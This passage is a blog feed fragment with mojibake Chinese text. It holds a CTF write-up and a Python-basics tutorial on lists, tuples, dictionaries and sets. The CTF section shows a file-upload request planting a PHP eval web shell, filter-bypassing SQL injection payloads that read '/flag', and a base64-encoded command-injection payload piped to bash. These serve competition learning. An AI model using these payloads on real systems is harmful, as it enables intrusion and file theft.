</span>http://101.32.220.189:32767/?action=upload</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------143906178423789204102969238846</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>276</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://101.32.220.189:32767</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">143906178423789204102969238846</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.zip.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nacl&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">143906178423789204102969238846</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240205145735598.png" alt="image-20240205145735598"></p><h2 id="sqlæ•™å­¦å±€"><a href="#sqlæ•™å­¦å±€" class="headerlink" title="sqlæ•™å­¦å±€"></a>sqlæ•™å­¦å±€</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/group_concat(flag)/**/ffromrom/**/secret.passwoorrd%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/group_concat(grade)ffromrom/**/ctf.scoorre/**/where/**/student/**/like/**/&#x27;begin&#x27;%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/lloadoad_file(&#x27;/flag&#x27;)%23</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆæƒ³å»rceçœ‹&#x2F;flagäº†,,,,,,,</p><p>å¿˜è®°äº†load_file()</p><h2 id="readbooks-æœªè§£å‡º"><a href="#readbooks-æœªè§£å‡º" class="headerlink" title="readbooks(æœªè§£å‡º)"></a>readbooks(æœªè§£å‡º)</h2><p>è™½ç„¶æœªæ‰¾åˆ°flagä½†æ˜¯payloadæ˜¯ä¸€ç‚¹æ²¡é—®é¢˜()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/list/a||ec&#x27;&#x27;ho$&#123;IFS&#125;&#x27;Y2F0IC9fZmxhZw&#x27;|bas&#x27;&#x27;e64$&#123;IFS&#125;-d|ba&#x27;&#x27;sh</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå·²ç»rceäº†,ä½†æ˜¯é‡Œé¢æ²¡æ‰¾åˆ°(æ„Ÿè§‰çœŸçš„æ²¡æœ‰)flag,,,,</p><h2 id="pickelshop-æœªè§£å‡º"><a href="#pickelshop-æœªè§£å‡º" class="headerlink" title="pickelshop(æœªè§£å‡º)"></a>pickelshop(æœªè§£å‡º)</h2><p>æ‹¿åˆ°æ³¨å†Œè¿”å›çš„cookieå¯ä»¥ç™»å½•</p><p>æ„Ÿè§‰è¦è§£ç ,,ä¸å¤ªä¼š</p><h2 id="king-æœªè§£å‡º"><a href="#king-æœªè§£å‡º" class="headerlink" title="king(æœªè§£å‡º)"></a>king(æœªè§£å‡º)</h2><p>æŠ“åŒ…äº†web Socketçš„æµé‡, çœ‹äº†MongoDBè¯­æ³•, è¿˜æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ³¨å…¥,,,</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰&quot;&gt;&lt;a href=&quot;#BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰&quot;&gt;&lt;/a&gt;BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰&lt;/h1&gt;&lt;h2 id=&quot;POPgadget&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
    <category term="nosqlæ³¨å…¥" scheme="http://example.com/tags/nosql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="sqlæ³¨å…¥" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="å‘½ä»¤æ³¨å…¥" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>pythonåŸºç¡€</title>
    <link href="http://example.com/2024/01/29/python%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/29/python%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-29T03:05:15.000Z</published>
    <updated>2024-01-29T15:40:47.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pythonåŸºç¡€"><a href="#pythonåŸºç¡€" class="headerlink" title="pythonåŸºç¡€"></a>pythonåŸºç¡€</h1><p>ä¹‹é—´ä¹Ÿå­¦è¿‡ä¸€äº›pythonç¼–ç¨‹åŸºç¡€,ä½†å¤§éƒ½æ˜¯é›¶æ•£ç¢ç‰‡åŒ–çš„çŸ¥è¯†</p><p>æ•…åœ¨æ­¤ç³»ç»Ÿåœ°è®°å½•ä¸€ä¸‹pythonçš„åŸºæœ¬è¯­æ³•ä»¥åŠå¸¸è§çš„æ“ä½œ</p><h2 id="åŸºç¡€è¯­æ³•"><a href="#åŸºç¡€è¯­æ³•" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h2><p>é¦–å…ˆæ˜¯ä¸€äº›åŸºç¡€è¯­æ³•,å¦‚ èµ‹å€¼, å››åˆ™è¿ç®—, é€‰æ‹©åˆ†æ”¯, å¾ªç¯, åµŒå¥—</p><p>ç”±äºä¸å…¶ä»–è¯­è¨€å¤§éƒ¨åˆ†éƒ½é‡å¤, è¿™é‡Œåªå†™ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ç¨‹åºæ¥æ¼”ç¤ºè¿™äº›åŸºæœ¬æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">2025</span>):</span><br><span class="line">    <span class="keyword">if</span> year % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> year % <span class="number">100</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> å¹´æ˜¯é—°å¹´&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> year % <span class="number">400</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> å¹´æ˜¯é—°å¹´&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> å¹´ä¸æ˜¯é—°å¹´&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœæ˜¾è€Œæ˜“è§</p><p>ç‰¹åˆ«çš„,pythonä¸­æœ‰<code>/</code>å’Œ<code>//</code>ä¸¤ç§é™¤æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span> / <span class="number">3</span>)<span class="comment">#0.3333333333333333</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> / <span class="number">3</span>)<span class="comment">#-0.3333333333333333</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> // <span class="number">3</span>)<span class="comment">#0</span></span><br><span class="line"><span class="built_in">print</span>(-<span class="number">1</span> // <span class="number">3</span>)<span class="comment">#-1</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶, <code>/</code>æ‰§è¡Œäº†æµ®ç‚¹è¿ç®—,è€Œ<code>//</code>åˆ™æ˜¯__å‘ä¸‹å–æ•´__</p><h2 id="åˆ—è¡¨-List"><a href="#åˆ—è¡¨-List" class="headerlink" title="åˆ—è¡¨(List)"></a>åˆ—è¡¨(List)</h2><p>ä¸¾ä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;kcl&#x27;</span>, <span class="string">&#x27;hcl&#x27;</span>]</span><br></pre></td></tr></table></figure><p>æœ‰ä»¥ä¸‹å‡ ç§åˆ‡ç‰‡æ–¹å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;kcl&#x27;</span>, <span class="string">&#x27;hcl&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>:])    <span class="comment"># æ‰“å°ç´¢å¼•ä¸º1å…ƒç´ åçš„æ‰€æœ‰å…ƒç´ (åŒ…å«ç´¢å¼•ä¸º1çš„å…ƒç´ ) </span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>:<span class="number">5</span>])   <span class="comment"># å·¦é—­å³å¼€</span></span><br><span class="line"><span class="built_in">print</span>(list1[:<span class="number">5</span>])    <span class="comment"># æ‰“å°ç´¢å¼•ä¸º5å…ƒç´ å‰çš„æ‰€æœ‰å…ƒç´ (ä¸åŒ…å«ç´¢å¼•ä¸º5çš„å…ƒç´ )</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">1</span>])    <span class="comment"># æœ€åä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ä¸º-1,ä»¥æ­¤ç±»æ¨</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">[2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;, &#x27;hcl&#x27;]</span><br><span class="line">[2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;]</span><br><span class="line">[1, 2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;]</span><br><span class="line">hcl</span><br></pre></td></tr></table></figure><h3 id="åˆ—è¡¨æ“ä½œ"><a href="#åˆ—è¡¨æ“ä½œ" class="headerlink" title="åˆ—è¡¨æ“ä½œ"></a>åˆ—è¡¨æ“ä½œ</h3><h4 id="æ›´æ–°åˆ—è¡¨"><a href="#æ›´æ–°åˆ—è¡¨" class="headerlink" title="æ›´æ–°åˆ—è¡¨"></a>æ›´æ–°åˆ—è¡¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">list1.append(<span class="string">&#x27;cabbage&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment">#è¾“å‡º: [1, 2, 3, &#x27;cabbage&#x27;]</span></span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤åˆ—è¡¨å…ƒç´ "><a href="#åˆ é™¤åˆ—è¡¨å…ƒç´ " class="headerlink" title="åˆ é™¤åˆ—è¡¨å…ƒç´ "></a>åˆ é™¤åˆ—è¡¨å…ƒç´ </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;cabbage&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> list1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment">#è¾“å‡º: [1, 2, 3]</span></span><br></pre></td></tr></table></figure><h4 id="åˆ—è¡¨æ“ä½œç¬¦"><a href="#åˆ—è¡¨æ“ä½œç¬¦" class="headerlink" title="åˆ—è¡¨æ“ä½œç¬¦"></a>åˆ—è¡¨æ“ä½œç¬¦</h4><p>å¸¸ç”¨çš„å°±æ˜¯<code>+</code>æ‹¼æ¥,<code>in</code>åˆ¤æ–­æŸå…ƒç´ æ˜¯å¦åœ¨åˆ—è¡¨ä¸­, è¿™é‡Œæ¬è¿ä¸€ä¸‹èœé¸Ÿæ•™ç¨‹ä¸Šçš„ä¸€ä¸ªè¡¨æ ¼</p><table><thead><tr><th align="left">Python è¡¨è¾¾å¼</th><th align="left">ç»“æœ</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">len([1, 2, 3])</td><td align="left">3</td><td align="left">é•¿åº¦</td></tr><tr><td align="left">[1, 2, 3] + [4, 5, 6]</td><td align="left">[1, 2, 3, 4, 5, 6]</td><td align="left">ç»„åˆ</td></tr><tr><td align="left">[â€˜Hi!â€™] * 4</td><td align="left">[â€˜Hi!â€™, â€˜Hi!â€™, â€˜Hi!â€™, â€˜Hi!â€™]</td><td align="left">é‡å¤</td></tr><tr><td align="left">3 in [1, 2, 3]</td><td align="left">True</td><td align="left">å…ƒç´ æ˜¯å¦å­˜åœ¨äºåˆ—è¡¨ä¸­</td></tr><tr><td align="left">for x in [1, 2, 3]: print(x, end&#x3D;â€ â€œ)</td><td align="left">1 2 3</td><td align="left">è¿­ä»£</td></tr></tbody></table><h4 id="åˆ—è¡¨åµŒå¥—"><a href="#åˆ—è¡¨åµŒå¥—" class="headerlink" title="åˆ—è¡¨åµŒå¥—"></a>åˆ—è¡¨åµŒå¥—</h4><p>åˆ—è¡¨æ˜¯å¯ä»¥åµŒå¥—å­˜åœ¨çš„, å³åˆ—è¡¨ä¸­çš„å…ƒç´ ä¹Ÿå¯ä»¥æ˜¯åˆ—è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, [<span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;cabbage&#x27;</span>], <span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">[&#x27;nacl&#x27;, &#x27;cabbage&#x27;]</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç¬¬äºŒä¸ªå…ƒç´ (ç´¢å¼•ä¸º1)å°±è¢«å£°æ˜æˆäº†ä¸€ä¸ªæœ‰ä¸¤ä¸ªå…ƒç´ çš„åˆ—è¡¨</p><p>__æ›´å¤šåˆ—è¡¨ç›¸å…³çš„å‡½æ•°ä¸æ–¹æ³•:__<a href="https://www.runoob.com/python3/python3-list.html">https://www.runoob.com/python3/python3-list.html</a></p><h2 id="å…ƒç»„-tuple"><a href="#å…ƒç»„-tuple" class="headerlink" title="å…ƒç»„(tuple)"></a>å…ƒç»„(tuple)</h2><p>ä¸listç›¸ä¼¼, å…ƒç»„æ˜¯ä¸€äº›å…ƒç´ çš„é›†åˆ, ä½†æ˜¯å…ƒç»„ä¸å¯ä¿®æ”¹</p><p>å…ƒç»„ä¸­åªåŒ…å«ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œéœ€è¦åœ¨å…ƒç´ åé¢æ·»åŠ é€—å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (<span class="number">50</span>,)</span><br></pre></td></tr></table></figure><p>å…ƒç»„çš„è®¿é—®æ–¹å¼ä¸listç›¸åŒ, å³éƒ½æ˜¯ä½¿ç”¨<code>[]</code>å¹¶åŠ ä¸Šç´¢å¼•æ¥è®¿é—®</p><h3 id="æ— å…³é—­åˆ†éš”ç¬¦"><a href="#æ— å…³é—­åˆ†éš”ç¬¦" class="headerlink" title="æ— å…³é—­åˆ†éš”ç¬¦"></a>æ— å…³é—­åˆ†éš”ç¬¦</h3><p>ä»»æ„æ— ç¬¦å·çš„å¯¹è±¡ï¼Œä»¥é€—å·éš”å¼€ï¼Œé»˜è®¤ä¸ºå…ƒç»„</p><p>â€¦è¯´å®è¯æ²¡å¤ªç†è§£,å®ƒç»™å‡ºäº†ä¸€ä¸ªä¾‹å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;abc&#x27;</span>, -<span class="number">4.24e93</span>, <span class="number">18</span>+<span class="number">6.6j</span>, <span class="string">&#x27;xyz&#x27;</span></span><br><span class="line">x, y = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Value of x , y : &quot;</span>, x,y</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå®ä¾‹è¿è¡Œç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc -4.24e+93 (18+6.6j) xyz</span><br><span class="line">Value of x , y : 1 2</span><br></pre></td></tr></table></figure><h3 id="å…ƒç»„å†…ç½®å‡½æ•°"><a href="#å…ƒç»„å†…ç½®å‡½æ•°" class="headerlink" title="å…ƒç»„å†…ç½®å‡½æ•°"></a>å…ƒç»„å†…ç½®å‡½æ•°</h3><table><thead><tr><th align="left">åºå·</th><th align="left">æ–¹æ³•åŠæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-cmp.html">cmp(tuple1, tuple2)</a> æ¯”è¾ƒä¸¤ä¸ªå…ƒç»„å…ƒç´ ã€‚</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-len.html">len(tuple)</a> è®¡ç®—å…ƒç»„å…ƒç´ ä¸ªæ•°ã€‚</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-max.html">max(tuple)</a> è¿”å›å…ƒç»„ä¸­å…ƒç´ æœ€å¤§å€¼ã€‚</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-min.html">min(tuple)</a> è¿”å›å…ƒç»„ä¸­å…ƒç´ æœ€å°å€¼ã€‚</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-tuple.html">tuple(seq)</a> å°†åˆ—è¡¨è½¬æ¢ä¸ºå…ƒç»„ã€‚</td></tr></tbody></table><h2 id="å­—å…¸-Dictionary"><a href="#å­—å…¸-Dictionary" class="headerlink" title="å­—å…¸(Dictionary)"></a>å­—å…¸(Dictionary)</h2><p>å­—å…¸é‡‡ç”¨é”®å€¼å¯¹çš„æ–¹å¼æ¥å­˜å‚¨ä»»æ„ç±»å‹çš„å¯¹è±¡</p><p>ä¸¾ä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;alice&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>, <span class="string">&#x27;mike&#x27;</span>: <span class="string">&#x27;43210&#x27;</span>, <span class="string">&#x27;bob&#x27;</span>: <span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;default&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(dic[<span class="string">&#x27;alice&#x27;</span>])</span><br><span class="line"><span class="comment"># è¾“å‡º: 12345</span></span><br></pre></td></tr></table></figure><p>ä»ç„¶é‡‡ç”¨<code>[]</code>æ¥è®¿é—®,åªä¸è¿‡ç´¢å¼•ä¸ºè¦è®¿é—®å…ƒç´ çš„é”®å</p><h3 id="ä¿®æ”¹å­—å…¸"><a href="#ä¿®æ”¹å­—å…¸" class="headerlink" title="ä¿®æ”¹å­—å…¸"></a>ä¿®æ”¹å­—å…¸</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tinydict[<span class="string">&#x27;Age&#x27;</span>] = <span class="number">8</span> <span class="comment"># æ›´æ–°</span></span><br><span class="line">tinydict[<span class="string">&#x27;School&#x27;</span>] = <span class="string">&quot;RUNOOB&quot;</span> <span class="comment"># æ·»åŠ </span></span><br><span class="line"><span class="keyword">del</span> tinydict[<span class="string">&#x27;Name&#x27;</span>]  <span class="comment"># åˆ é™¤é”®æ˜¯&#x27;Name&#x27;çš„æ¡ç›®</span></span><br><span class="line">tinydict.clear()      <span class="comment"># æ¸…ç©ºå­—å…¸æ‰€æœ‰æ¡ç›®</span></span><br><span class="line"><span class="keyword">del</span> tinydict          <span class="comment"># åˆ é™¤å­—å…¸</span></span><br></pre></td></tr></table></figure><h3 id="å­—å…¸ç‰¹æ€§"><a href="#å­—å…¸ç‰¹æ€§" class="headerlink" title="å­—å…¸ç‰¹æ€§"></a>å­—å…¸ç‰¹æ€§</h3><p>å­—å…¸å€¼å¯ä»¥æ˜¯ä»»ä½•çš„ python å¯¹è±¡ï¼Œæ—¢å¯ä»¥æ˜¯æ ‡å‡†çš„å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·å®šä¹‰çš„ï¼Œä½†é”®ä¸è¡Œ</p><p>1ï¼‰ä¸å…è®¸åŒä¸€ä¸ªé”®å‡ºç°ä¸¤æ¬¡ã€‚åˆ›å»ºæ—¶å¦‚æœåŒä¸€ä¸ªé”®è¢«èµ‹å€¼ä¸¤æ¬¡ï¼Œåä¸€ä¸ªå€¼ä¼šè¢«è®°ä½</p><p>2ï¼‰é”®å¿…é¡»ä¸å¯å˜ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ•°å­—ï¼Œå­—ç¬¦ä¸²æˆ–å…ƒç»„å……å½“ï¼Œè€Œç”¨åˆ—è¡¨å°±ä¸è¡Œ</p><p>æ›´å¤š: </p><p><a href="https://www.runoob.com/python3/python3-dictionary.html">https://www.runoob.com/python3/python3-dictionary.html</a></p><h2 id="é›†åˆ-set"><a href="#é›†åˆ-set" class="headerlink" title="é›†åˆ(set)"></a>é›†åˆ(set)</h2><p>ç¤ºä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">words = &#123;<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;cabbage&#x27;</span>&#125;</span><br><span class="line">words.add(<span class="string">&#x27;rabbit&#x27;</span>)<span class="comment">#æ·»åŠ </span></span><br><span class="line">words.update([<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment">#å‚æ•°å¯ä»¥æ˜¯åˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ç­‰ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹</span></span><br><span class="line">words.remove(<span class="string">&#x27;cabbage&#x27;</span>)<span class="comment">#åˆ é™¤</span></span><br><span class="line">s.discard(<span class="string">&#x27;cat&#x27;</span>)<span class="comment">#æ­¤æ–¹æ³•åˆ é™¤å…ƒç´ æ—¶å¦‚æœå…ƒç´ ä¸å­˜åœ¨ï¼Œä¸ä¼šå‘ç”Ÿé”™è¯¯</span></span><br><span class="line"><span class="built_in">print</span>(words)</span><br><span class="line">è¾“å‡º:&#123;<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-add.html">add()</a></td><td align="left">ä¸ºé›†åˆæ·»åŠ å…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-clear.html">clear()</a></td><td align="left">ç§»é™¤é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-copy.html">copy()</a></td><td align="left">æ‹·è´ä¸€ä¸ªé›†åˆ</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference.html">difference()</a></td><td align="left">è¿”å›å¤šä¸ªé›†åˆçš„å·®é›†</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference_update.html">difference_update()</a></td><td align="left">ç§»é™¤é›†åˆä¸­çš„å…ƒç´ ï¼Œè¯¥å…ƒç´ åœ¨æŒ‡å®šçš„é›†åˆä¹Ÿå­˜åœ¨ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-discard.html">discard()</a></td><td align="left">åˆ é™¤é›†åˆä¸­æŒ‡å®šçš„å…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection.html">intersection()</a></td><td align="left">è¿”å›é›†åˆçš„äº¤é›†</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection_update.html">intersection_update()</a></td><td align="left">è¿”å›é›†åˆçš„äº¤é›†ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-isdisjoint.html">isdisjoint()</a></td><td align="left">åˆ¤æ–­ä¸¤ä¸ªé›†åˆæ˜¯å¦åŒ…å«ç›¸åŒçš„å…ƒç´ ï¼Œå¦‚æœæ²¡æœ‰è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issubset.html">issubset()</a></td><td align="left">åˆ¤æ–­æŒ‡å®šé›†åˆæ˜¯å¦ä¸ºè¯¥æ–¹æ³•å‚æ•°é›†åˆçš„å­é›†ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issuperset.html">issuperset()</a></td><td align="left">åˆ¤æ–­è¯¥æ–¹æ³•çš„å‚æ•°é›†åˆæ˜¯å¦ä¸ºæŒ‡å®šé›†åˆçš„å­é›†</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-pop.html">pop()</a></td><td align="left">éšæœºç§»é™¤å…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-remove.html">remove()</a></td><td align="left">ç§»é™¤æŒ‡å®šå…ƒç´ </td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference.html">symmetric_difference()</a></td><td align="left">è¿”å›ä¸¤ä¸ªé›†åˆä¸­ä¸é‡å¤çš„å…ƒç´ é›†åˆã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference_update.html">symmetric_difference_update()</a></td><td align="left">ç§»é™¤å½“å‰é›†åˆä¸­åœ¨å¦å¤–ä¸€ä¸ªæŒ‡å®šé›†åˆç›¸åŒçš„å…ƒç´ ï¼Œå¹¶å°†å¦å¤–ä¸€ä¸ªæŒ‡å®šé›†åˆä¸­ä¸åŒçš„å…ƒç´ æ’å…¥åˆ°å½“å‰é›†åˆä¸­ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-union.html">union()</a></td><td align="left">è¿”å›ä¸¤ä¸ªé›†åˆçš„å¹¶é›†</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-update.html">update()</a></td><td align="left">ç»™é›†åˆæ·»åŠ å…ƒç´ </td></tr><tr><td align="left"><a 